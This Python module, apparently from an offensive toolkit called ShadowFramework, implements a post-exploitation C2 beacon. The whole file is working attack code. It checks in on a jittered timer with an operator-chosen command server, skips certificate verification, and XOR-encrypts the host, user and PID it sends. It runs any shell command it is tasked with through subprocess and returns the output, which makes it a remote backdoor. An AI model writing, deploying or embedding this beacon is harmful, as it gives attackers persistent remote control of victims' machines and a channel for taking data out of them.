"""
ShadowFramework — C2 Beacon
Beacon-based C2 using encrypted transport for periodic check-in and command execution.
"""
import socket
import ssl
import json
import time
import subprocess
import threading
import base64
import hashlib
import os
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()


class Module:
    MODULE_INFO = {
        'name': 'post/c2_beacon',
        'description': 'Start a C2 beacon that checks in with the C2 server and executes tasked commands.',
        'options': {
            'C2_HOST':   'C2 server address',
            'C2_PORT':   'C2 server port [default: 4443]',
            'INTERVAL':  'Check-in interval in seconds [default: 30]',
            'JITTER':    'Jitter percentage (randomizes interval) [default: 20]',
            'KEY':       'Encryption key [default: shadow_default_key]',
            'DURATION':  'Run duration (0=forever) [default: 0]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self._stop = False

    def _derive_key(self, key_str):
        """Derive 32-byte key from passphrase."""
        return hashlib.sha256(key_str.encode()).digest()

    def _xor_crypt(self, data, key):
        """XOR stream cipher."""
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    def _beacon_loop(self, host, port, interval, jitter_pct, key):
        """Main beacon loop: check in, get tasks, execute, report back."""
        import random
        key_bytes = self._derive_key(key)
        
        while not self._stop:
            try:
                # Connect to C2
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                
                # Try TLS first
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                except Exception:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                
                s.connect((host, port))
                
                # Send check-in
                checkin = json.dumps({
                    'type': 'checkin',
                    'host': socket.gethostname(),
                    'user': os.getenv('USER', 'unknown'),
                    'pid': os.getpid(),
                    'ts': time.time(),
                }).encode()
                
                encrypted = self._xor_crypt(checkin, key_bytes)
                s.sendall(len(encrypted).to_bytes(4, 'big') + encrypted)

                # Receive tasking
                try:
                    length_data = s.recv(4)
                    if length_data:
                        length = int.from_bytes(length_data, 'big')
                        task_data = b''
                        while len(task_data) < length:
                            chunk = s.recv(min(4096, length - len(task_data)))
                            if not chunk:
                                break
                            task_data += chunk
                        
                        task_json = json.loads(self._xor_crypt(task_data, key_bytes))
                        
                        if task_json.get('type') == 'cmd':
                            cmd = task_json.get('cmd', '')
                            console.print(f"  [yellow]Task: {cmd}[/yellow]")
                            
                            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                            output = result.stdout + result.stderr
                            
                            # Send result back
                            response = json.dumps({
                                'type': 'result',
                                'cmd': cmd,
                                'output': output[:8192],
                                'rc': result.returncode,
                            }).encode()
                            encrypted = self._xor_crypt(response, key_bytes)
                            s.sendall(len(encrypted).to_bytes(4, 'big') + encrypted)
                            
                            console.print(f"  [green]✓ Result sent ({len(output)} bytes)[/green]")
                        
                        elif task_json.get('type') == 'kill':
                            console.print("[yellow][*] Kill command received.[/yellow]")
                            self._stop = True
                            s.close()
                            return
                            
                except socket.timeout:
                    pass

                s.close()
                
            except ConnectionRefusedError:
                console.print(f"  [dim]C2 unreachable — will retry...[/dim]")
            except Exception as e:
                console.print(f"  [dim]Beacon error: {e}[/dim]")

            # Sleep with jitter
            jitter = interval * (jitter_pct / 100)
            sleep_time = interval + random.uniform(-jitter, jitter)
            time.sleep(max(1, sleep_time))

    def run(self):
        host = self.framework.options.get('C2_HOST')
        port = int(self.framework.options.get('C2_PORT', '4443'))
        interval = int(self.framework.options.get('INTERVAL', '30'))
        jitter = int(self.framework.options.get('JITTER', '20'))
        key = self.framework.options.get('KEY', 'shadow_default_key')
        duration = int(self.framework.options.get('DURATION', '0'))

        if not host:
            console.print("[red][!] C2_HOST is required.[/red]")
            return

        console.print(f"[cyan][*] Starting C2 beacon → {host}:{port}[/cyan]")
        console.print(f"    Interval: {interval}s (±{jitter}% jitter)")
        log_action(f"C2 beacon started: {host}:{port}")

        if duration > 0:
            timer = threading.Timer(duration, lambda: setattr(self, '_stop', True))
            timer.daemon = True
            timer.start()

        try:
            self._beacon_loop(host, port, interval, jitter, key)
        except KeyboardInterrupt:
            self._stop = True
            console.print("\n[yellow][*] Beacon stopped.[/yellow]")

        console.print(f"[bold green][+] Beacon terminated.[/bold green]")
